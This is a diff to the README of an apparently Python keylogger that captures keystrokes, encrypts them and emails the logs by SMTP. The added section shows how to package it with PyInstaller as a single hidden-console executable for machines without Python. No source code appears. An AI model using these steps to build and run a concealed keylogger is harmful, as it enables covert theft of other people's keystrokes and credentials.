@@ -10,6 +10,7 @@ This project implements a keylogger using Python, which captures keystrokes, enc
 - [Configuration](#configuration)
 - [Usage](#usage)
   - [Starting the Keylogger](#starting-the-keylogger)
+  - [Creating an Executable](#creating-an-executable)
   - [Decrypting Keystrokes](#decrypting-keystrokes)
   - [Checking SMTP Connection](#checking-smtp-connection)
   - [Testing Email Logs](#testing-email-logs)
@@ -62,6 +63,23 @@ To start capturing keystrokes and receiving logs by email:
 ```bash
 python test_1.py
 ```
+
+### Creating an Executable
+To run the keylogger on systems without Python installed, you can create a standalone executable:
+
+1. Install **PyInstaller**:
+   ```bash
+   pip install pyinstaller
+   ```
+
+2. Create a standalone executable:
+   ```bash
+   pyinstaller --onefile --noconsole test_1.py
+   ```
+   - `--onefile`: Combines everything into a single executable file.
+   - `--noconsole`: Hides the console window when running the executable.
+
+The resulting executable will be located in the `dist` folder.
 
 ### Decrypting Keystrokes
 To view the captured and encrypted keystrokes:
